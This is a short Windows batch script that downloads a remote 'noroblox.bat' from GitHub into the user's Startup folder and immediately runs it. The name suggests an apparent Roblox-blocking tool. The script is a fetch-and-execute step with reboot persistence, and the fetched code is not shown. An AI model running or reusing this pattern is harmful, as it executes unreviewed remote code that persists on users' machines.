@echo off
:: Set variables
set "url=https://raw.githubusercontent.com/Zombro01/blob.../refs/heads/main/noroblox.bat"
set "output_file=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\noroblox.bat"

:: Check if curl is available
where curl >nul 2>&1
if not errorlevel 1 (
    :: Use curl to download the file to the startup folder
    curl -o "%output_file%" "%url%"
    goto done
)

:: Fallback to PowerShell if curl is not available
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output_file%'"

:done
:: Run the downloaded batch file in a new terminal window
start cmd /c "%output_file%"

echo Batch file created and executed in a new terminal from Startup folder as %output_file%
pause
